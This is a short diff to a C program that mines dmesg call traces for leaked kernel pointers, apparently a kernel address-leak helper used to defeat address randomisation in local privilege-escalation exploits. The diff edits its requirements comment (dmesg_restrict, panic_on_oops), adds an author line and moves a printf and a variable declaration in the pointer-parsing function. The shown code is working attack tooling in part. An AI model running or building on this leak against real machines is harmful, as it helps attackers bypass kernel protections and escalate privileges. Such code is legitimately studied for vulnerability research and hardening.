@@ -4,9 +4,10 @@
 // that looks like a kernel pointer.
 //
 // Requires:
-// - kernel.dmesg_restrict = 0 (Default on Ubuntu systems);
-//   or CAP_SYSLOG capabilities.
+// - kernel.dmesg_restrict = 0; or CAP_SYSLOG capabilities.
 // - kernel.panic_on_oops = 0 (Default on most systems).
+// ---
+// <bcoles@gmail.com>
 
 #define _GNU_SOURCE
 #include <stdint.h>
@@ -47,18 +48,18 @@ int mmap_syslog(char **buffer, int *size) {
 unsigned long search_dmesg_kernel_pointers() {
   char *syslog;
   char *ptr;
+  char *endptr;
   int size;
   unsigned long addr = 0;
   unsigned long leaked_addr = 0;
 
+  printf("[.] searching dmesg for call trace kernel pointers ...\n");
+
   if (mmap_syslog(&syslog, &size))
     return 0;
 
-  printf("[.] searching dmesg for call trace kernel pointers ...\n");
-
   ptr = strtok(syslog, "[<");
   while ((ptr = strtok(NULL, "[<")) != NULL) {
-    char *endptr = &ptr[strlen(ptr)];
     leaked_addr = (unsigned long)strtoull(&ptr[0], &endptr, 16);
 
     if (!leaked_addr)
